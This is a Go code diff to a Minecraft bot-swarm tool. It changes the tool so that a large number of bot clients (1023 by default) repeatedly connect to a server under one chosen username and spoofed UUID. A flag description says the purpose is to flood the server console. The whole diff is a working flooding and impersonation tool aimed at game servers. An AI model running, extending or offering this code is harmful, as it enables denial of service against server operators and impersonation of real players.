@@ -19,6 +19,8 @@ import (
 
 var (
 	address  = flag.String("address", "127.0.0.1", "The server address")
+	username = flag.String("username", "TheFifthColumn", "Username to flood console with")
+	uuid     = flag.String("uuid", "ed6a50a4-1104-41cf-b81a-7b98c6297b5f", "UUID of username (1.19.2 specific)")
 	protocol = flag.Int("protocol", 763, "The server's protocol version")
 	number   = flag.Int("number", 1023, "The number of clients")
 )
@@ -29,14 +31,11 @@ func main() {
 	for i := 0; i < *number; i++ {
 		go func(i int) {
 			for {
-				ind := newIndividual(i, "FifthColumn"+strconv.Itoa(i))
-				//ind := newIndividual(i, "TheFifthColumn")
+				ind := newIndividual(i, *username)
 				ind.run(*address, *protocol)
 				time.Sleep(time.Second * 3)
 			}
 		}(i)
-		//time.Sleep(time.Millisecond)
-		//time.Sleep(0)
 	}
 	select {}
 }
@@ -52,6 +51,7 @@ func newIndividual(id int, name string) (i *individual) {
 	i.id = id
 	i.client = bot.NewClient()
 	i.client.Auth.Name = name
+	i.client.Auth.UUID = *uuid
 	i.player = basic.NewPlayer(i.client, basic.DefaultSettings, basic.EventsListener{
 		GameStart:  i.onGameStart,
 		Disconnect: onDisconnect,
